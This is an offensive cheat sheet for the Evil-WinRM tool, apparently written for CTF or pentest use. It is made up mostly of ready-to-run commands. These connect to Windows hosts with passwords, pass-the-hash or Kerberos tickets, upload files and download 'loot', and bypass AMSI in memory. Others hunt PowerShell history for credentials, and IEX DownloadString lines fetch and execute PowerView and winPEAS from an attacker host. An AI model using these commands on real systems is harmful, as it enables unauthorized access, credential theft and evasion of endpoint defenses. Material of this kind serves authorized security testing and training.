# Evil-WinRM cheat sheet

WinRM = ports **5985** (http) / **5986** (https). Needs valid Windows creds and
the account in the *Remote Management Users* group.

## Connect
```bash
# Password auth
evil-winrm -i 10.10.10.10 -u Administrator -p 'Password123!'

# NTLM hash (pass-the-hash) — no password needed
evil-winrm -i 10.10.10.10 -u Administrator -H 2b576acbe6bcfda7294d6bd18041b8fe

# Kerberos (after getting a TGT with impacket getTGT.py)
export KRB5CCNAME=administrator.ccache
evil-winrm -i dc01.corp.local -r corp.local

# SSL / port 5986 (ignore cert)
evil-winrm -i 10.10.10.10 -u user -p pass -S

# With local scripts + executables staged for upload/loading
evil-winrm -i 10.10.10.10 -u user -p pass -s /opt/scripts/ -e /opt/exes/
```

## Built-in menu commands (inside the session)
```
upload /local/path C:\Windows\Temp\file.exe   # push a file to the target
download C:\Users\user\Desktop\flag.txt        # pull loot back
services                                        # list services
menu                                            # show loaded functions after -s/-e
Bypass-4MSI                                      # in-memory AMSI bypass
Invoke-Binary /opt/exes/nc.exe                   # run a .NET exe from memory
```

## First things to run once you're in
```powershell
whoami /all                       # groups + privileges (look for SeImpersonate!)
type C:\Users\<you>\Desktop\user.txt
hostname; systeminfo
net user; net localgroup administrators
Get-ChildItem -Path C:\Users -Recurse -Filter *.txt -ErrorAction SilentlyContinue
# PowerShell history — often has creds
type (Get-PSReadlineOption).HistorySavePath
```

## Loading tools from memory (no disk write)
```powershell
# Serve from your box:  python3 -m http.server 80
IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.5/PowerView.ps1')
IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.5/winPEAS.ps1')
```

## Common gotchas
- `WinRM::WinRMAuthorizationError` → account isn't in *Remote Management Users*; try RDP/SMB or find another user.
- Hangs on connect → wrong port (try `-S` for 5986) or firewall.
- Upload fails → path needs to exist and be writable; use `C:\Windows\Temp\`.
